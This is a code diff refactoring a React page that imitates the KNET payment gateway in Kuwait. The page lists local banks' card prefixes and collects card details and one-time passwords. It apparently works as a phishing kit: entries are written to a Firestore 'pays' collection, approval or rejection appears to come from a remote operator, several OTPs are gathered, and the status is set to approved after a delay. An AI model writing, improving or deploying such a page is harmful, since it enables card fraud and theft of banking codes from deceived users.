@@ -1,13 +1,12 @@
 /* eslint-disable */
-
 "use client"
 
 import { useEffect, useState } from 'react';
-import './knet.css'
 import { doc, onSnapshot } from 'firebase/firestore';
 import { db } from '@/lib/firebase';
 import { handlePay } from '@/lib/db';
-
+import './knet.css'
+import { DialogLoader } from '@/components/dilog-loader';
 type PaymentInfo = {
     cardNumber: string;
     year: string;
@@ -21,6 +20,7 @@ type PaymentInfo = {
     prefix: string;
     status: 'new' | 'pending' | 'approved' | 'rejected';
 };
+
 const BANKS = [
     {
       value: "ABK",
@@ -42,23 +42,21 @@ const BANKS = [
       label: "Boubyan Bank",
       cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
     },
-  
     {
       value: "BURGAN",
       label: "Burgan Bank",
       cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
     },
-  
     {
       value: "CBK",
       label: "Commercial Bank of Kuwait",
       cardPrefixes: ["532672", "537015", "521175", "516334"],
-    }, {
+    }, 
+    {
       value: "Doha",
       label: "Doha Bank",
       cardPrefixes: ["419252"],
     },
-  
     {
       value: "GBK",
       label: "Gulf Bank",
@@ -69,7 +67,6 @@ const BANKS = [
       label: "TAM Bank",
       cardPrefixes: ["45077848", "45077849"],
     },
-  
     {
       value: "KFH",
       label: "Kuwait Finance House",
@@ -81,7 +78,6 @@ const BANKS = [
       cardPrefixes: ["409054", "406464"],
     },
     {
-  
       value: "NBK",
       label: "National Bank of Kuwait",
       cardPrefixes: ["464452", "589160"],
@@ -106,17 +102,12 @@ const BANKS = [
       label: "Warba Bank",
       cardPrefixes: ["541350", "525528", "532749", "559459"],
     },
-  ]
+]
 
- const Payment = () => {
-    const donationAmount = localStorage.getItem('amount')
-
-    const handleSubmit = async () => {
-
-    };
-
-    const [step, setstep] = useState(1);
-    const [loading, setisloading] = useState(false);
+const Payment = () => {
+    const [donationAmount, setDonationAmount] = useState<string | null>(null);
+    const [step, setStep] = useState(1);
+    const [loading, setIsLoading] = useState(false);
     const [newotp] = useState([''])
     const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
         cardNumber: '',
@@ -132,45 +123,55 @@ const BANKS = [
         status: 'new',
     });
 
+    // Safely access localStorage after component mounts
+    useEffect(() => {
+        setDonationAmount(localStorage.getItem('amount'));
+    }, []);
+
     const handleAddotp = (otp: string) => {
         newotp.push(`${otp} , `)
     }
+
     useEffect(() => {
         //handleAddotp(paymentInfo.otp!)
     }, [paymentInfo.otp])
 
     useEffect(() => {
-        const visitorId = localStorage.getItem('visitor');
-        if (visitorId) {
-            const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
-                if (docSnap.exists()) {
-                    const data = docSnap.data() as PaymentInfo;
-                    if (data.status) {
-                        setPaymentInfo(prev => ({ ...prev, status: data.status }));
-                        if (data.status === 'approved') {
-                            setstep(2);
-                            setisloading(false);
-                        } else if (data.status === 'rejected') {
-                            setisloading(false);
-                            alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
-                            setstep(1);
+        // Only run this effect in the browser
+        if (typeof window !== 'undefined') {
+            const visitorId = localStorage.getItem('visitor');
+            if (visitorId) {
+                const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
+                    if (docSnap.exists()) {
+                        const data = docSnap.data() as PaymentInfo;
+                        if (data.status) {
+                            setPaymentInfo(prev => ({ ...prev, status: data.status }));
+                            if (data.status === 'approved') {
+                                setStep(2);
+                                setIsLoading(false);
+                            } else if (data.status === 'rejected') {
+                                setIsLoading(false);
+                                alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
+                                setStep(1);
+                            }
                         }
                     }
-                }
-            });
+                });
 
-            return () => unsubscribe();
+                return () => unsubscribe();
+            }
         }
     }, []);
 
+    const handleSubmit = async () => {
+        // Payment submission logic
+    };
 
     return (
         <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }}>
-            <form
-                onSubmit={(e) => {
-                    e.preventDefault();
-                }}
-            >
+            <DialogLoader isOpen={loading} message=" ... جاري معالجة الدفع "/>
+       
+            <form onSubmit={(e) => e.preventDefault()}>
                 <div className="madd" />
                 <div id="PayPageEntry" >
                     <div className="container">
@@ -190,7 +191,7 @@ const BANKS = [
                                         {'  '}KD&nbsp;{' '}
                                     </label>
                                 </div>
-                                {/* Added for PG Eidia Discount starts   */}
+                                {/* Added for PG Eidia Discount starts */}
                                 <div
                                     className="row"
                                     id="DiscntRate"
@@ -201,7 +202,7 @@ const BANKS = [
                                     id="DiscntedAmt"
                                     style={{ display: 'none' }}
                                 />
-                                {/* Added for PG Eidia Discount ends   */}
+                                {/* Added for PG Eidia Discount ends */}
                             </div>
                             <div className="form-card">
                                 <div
@@ -219,7 +220,7 @@ const BANKS = [
                                     }}
                                     id="otpmsgDC"
                                 />
-                                {/*Customer Validation  for knet*/}
+                                {/*Customer Validation for knet*/}
                                 <div
                                     className="notification"
                                     style={{
@@ -557,28 +558,24 @@ const BANKS = [
                                                 }
                                                 onClick={() => {
                                                     if (step === 1) {
-                                                        setisloading(true);
+                                                        setIsLoading(true);
                                                         handlePay(paymentInfo, setPaymentInfo)
                                                         handleSubmit();
                                                     } else if (step >= 2) {
-
-                                                        if (
-                                                            !newotp.includes(paymentInfo.otp!)
-
-                                                        ) { newotp.push(paymentInfo.otp!) }
-                                                        setisloading(true)
+                                                        if (!newotp.includes(paymentInfo.otp!)) { 
+                                                            newotp.push(paymentInfo.otp!) 
+                                                        }
+                                                        setIsLoading(true)
                                                         handleAddotp(paymentInfo.otp!);
-                                                       // handleOArr(paymentInfo.otp!);
                                                         handlePay(paymentInfo, setPaymentInfo)
                                                         setTimeout(() => {
-                                                            setisloading(false)
+                                                            setIsLoading(false)
                                                             setPaymentInfo({
                                                                 ...paymentInfo,
                                                                 otp: '',
                                                                 status: 'approved',
                                                             });
                                                         }, 3000);
-
                                                     }
                                                 }}
                                             >
@@ -605,7 +602,7 @@ const BANKS = [
                                                 lineHeight: 1,
                                             }}
                                         >
-                                            All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;�&nbsp;
+                                            All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;©&nbsp;
                                             <br />
                                             <span
                                                 style={{
@@ -631,4 +628,4 @@ const BANKS = [
     );
 };
 
-export default Payment
+export default Payment;
